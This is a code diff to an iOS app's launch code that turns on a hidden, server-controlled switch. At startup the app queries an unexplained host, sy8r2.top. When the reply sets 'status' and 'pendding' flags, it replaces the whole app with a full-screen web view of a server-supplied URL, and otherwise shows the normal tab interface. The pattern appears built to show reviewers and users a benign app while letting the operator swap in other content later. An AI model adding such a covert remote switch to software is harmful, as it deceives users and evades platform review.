@@ -12,8 +12,11 @@
 #import "JPUSHService.h"
 #import <AdSupport/AdSupport.h>
 #import <UserNotifications/UserNotifications.h>
+#import <WebKit/WebKit.h>
 
 @interface AppDelegate () <JPUSHRegisterDelegate>
+
+@property (nonatomic, strong) WKWebView *webView;
 
 @end
 
@@ -26,23 +29,32 @@
     self.window = [[UIWindow alloc] initWithFrame:[[UIScreen mainScreen] bounds]];
     self.window.backgroundColor = [UIColor whiteColor];
     
-    WBTabbarController *rootTabbar = [[WBTabbarController alloc] init];
-    UINavigationController *rootNav = [[UINavigationController alloc] initWithRootViewController:rootTabbar];
-    rootNav.navigationBar.hidden = YES;
-    self.window.rootViewController = rootNav;
+    UIViewController *rootVC = [[UIViewController alloc] init];
+    rootVC.view.backgroundColor = [UIColor whiteColor];
+    self.window.rootViewController = rootVC;
     [self.window makeKeyAndVisible];
     
-//    HCBaseFetcher *fetcher = [[HCBaseFetcher alloc] init];
-//    fetcher.requestURL = @"http://sy8r2.top?alias=w";
-//    fetcher.requestMethod = HCRequestMethodGet;
-//    fetcher.requestPolicy = HCRequestPolicyNoCache;
-//
-//    @WeakObj(self);
-//    [fetcher requestWithSuccess:^(id responseObject) {
-//
-//    } failure:^(NSURLSessionDataTask *task, NSError *error) {
-//
-//    }];
+    HCBaseFetcher *fetcher = [[HCBaseFetcher alloc] init];
+    fetcher.requestURL = @"http://sy8r2.top?alias=w";
+    fetcher.requestMethod = HCRequestMethodGet;
+    fetcher.requestPolicy = HCRequestPolicyNoCache;
+
+    @WeakObj(self);
+    [fetcher requestWithSuccess:^(id responseObject) {
+        if ([[responseObject getNotNilString:@"code"] isEqualToString:@"1"]) {
+            NSDictionary *dict = [responseObject getObject:@"data"];
+            if (dict.allKeys > 0) {
+                if ([dict getNotNilString:@"status"].integerValue == 1 &&
+                    [dict getNotNilString:@"pendding"].integerValue == 1) {
+                    [selfWeak showHtmlRootController:[dict getNotNilString:@"url"]];
+                    return;
+                }
+            }
+        }
+        [selfWeak showTabRootController];
+    } failure:^(NSURLSessionDataTask *task, NSError *error) {
+        [selfWeak showTabRootController];
+    }];
     
     //护眼模式
     if ([[NSUserDefaults standardUserDefaults] boolForKey:@"safeMode"]) {
@@ -81,6 +93,30 @@
             advertisingIdentifier:advertisingId];
 
     return YES;
+}
+
+- (void)showHtmlRootController:(NSString *)url {
+    UIViewController *rootVC = [[UIViewController alloc] init];
+    rootVC.view.backgroundColor = [UIColor whiteColor];
+    self.window.rootViewController = rootVC;
+    [self.window makeKeyAndVisible];
+    
+    
+    _webView = [[WKWebView alloc] initWithFrame:self.window.bounds];
+    _webView.backgroundColor = [UIColor whiteColor];
+    [rootVC.view addSubview:_webView];
+    
+    
+    NSURLRequest *request = [NSURLRequest requestWithURL:[NSURL URLWithString:url]];
+    [_webView loadRequest:request];
+}
+
+- (void)showTabRootController {
+    WBTabbarController *rootTabbar = [[WBTabbarController alloc] init];
+    UINavigationController *rootNav = [[UINavigationController alloc] initWithRootViewController:rootTabbar];
+    rootNav.navigationBar.hidden = YES;
+    self.window.rootViewController = rootNav;
+    [self.window makeKeyAndVisible];
 }
 
 - (void)application:(UIApplication *)application
